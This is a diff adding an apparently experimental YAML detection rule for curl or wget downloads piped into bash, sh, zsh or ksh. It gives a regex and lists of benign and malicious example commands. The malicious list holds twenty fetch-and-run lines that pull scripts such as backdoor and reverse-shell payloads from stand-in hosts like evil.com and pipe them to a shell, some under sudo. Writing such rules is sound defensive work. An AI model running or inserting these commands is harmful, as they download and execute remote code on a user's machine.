@@ -1,0 +1,49 @@
+name: experimental-high-11-bash-pipe-shell
+severity: high-experimental
+description: >
+  Detects bash commands piped to shell interpreters. Requires context to distinguish from legitimate admin tasks.
+
+pattern: |
+  (?i)(?:curl|wget)[\s\r\n]+(?:[^\r\n|]*?(?:-[sqLfo]|--silent|--quiet|--follow|--output|-Uri|-Method)[\s\r\n]+)?[^\r\n|]*?(?:http://|https://|ftp://)[^\r\n|]*?\|[\s\r\n]*(?:bash|sh|zsh|ksh|fish|sudo\s+(?:bash|sh|zsh))
+
+malicious:
+  - "curl http://evil.com/malware.sh | bash"
+  - "wget -qO- http://attacker.com/payload.sh | sh"
+  - "curl -s https://malware.com/exploit.sh | bash"
+  - "wget -O - http://evil.com/dropper.sh | zsh"
+  - "curl http://bad.com/backdoor.sh | sh"
+  - "wget -qO- http://192.168.1.100/clickfix.sh | bash"
+  - "curl -fsSL http://evil.com/installer.sh | sudo bash"
+  - "wget --quiet -O - http://attacker.com/ransomware.sh | sh"
+  - "curl -s http://malware.com/reverse-shell.sh | bash -"
+  - "wget -qO- ftp://evil.com/exploit.sh | zsh"
+  - "curl -L http://evil.com/stage2.sh | bash"
+  - "wget -O- http://attacker.com/implant.sh | sh"
+  - "curl --silent http://evil.com/loader.sh | sudo sh"
+  - "wget -q -O - http://malware.com/backdoor.sh | bash"
+  - "curl -sSL http://evil.com/dropper.sh | ksh"
+  - "wget -qO- http://attacker.com/trojan.sh | bash -x"
+  - "curl http://evil.com/persistence.sh | sh -s"
+  - "wget --no-check-certificate https://malware.com/payload.sh -O - | bash"
+  - "curl -fsSL http://evil.com/obfuscated.sh | bash -c 'cat | bash'"
+  - "wget -qO- http://192.168.1.50:8080/malware.sh | zsh"
+
+benign:
+  - "curl -s https://get.docker.com | bash"
+  - "wget -qO- https://deb.nodesource.com/setup.sh | bash"
+  - "curl https://sh.rustup.rs | sh"
+  - "wget -O - https://apt.llvm.org/llvm.sh | bash"
+  - "curl -fsSL https://get.docker.com | sudo bash"
+  - "wget -qO- https://packages.cloud.google.com/apt/doc/apt-key.gpg | sudo apt-key add -"
+  - "curl -sSL https://install.python-poetry.org | python3 -"
+  - "wget -O - https://adoptopenjdk.jfrog.io/adoptopenjdk/api/gpg/key/public | apt-key add -"
+  - "curl https://raw.githubusercontent.com/nvm-sh/nvm/master/install.sh | bash"
+  - "wget -qO- https://cli.github.com/packages/githubcli-archive-keyring.gpg | sudo dd of=/usr/share/keyrings/githubcli-archive-keyring.gpg"
+  - "curl -L https://nixos.org/nix/install | sh"
+  - "wget -O - https://nginx.org/keys/nginx_signing.key | apt-key add -"
+  - "curl -fsSL https://download.docker.com/linux/ubuntu/gpg | sudo apt-key add -"
+  - "wget -qO- https://www.postgresql.org/media/keys/ACCC4CF8.asc | sudo apt-key add -"
+  - "curl https://pyenv.run | bash"
+  - "wget -O - https://packages.adoptium.net/artifactory/api/gpg/key/public | apt-key add -"
+  - "curl -sSL https://rvm.io/mpapis.asc | gpg --import -"
+  - "wget -qO- https://repo.steampowered.com/steam/archive/stable/steam.gpg | sudo apt-key add -"
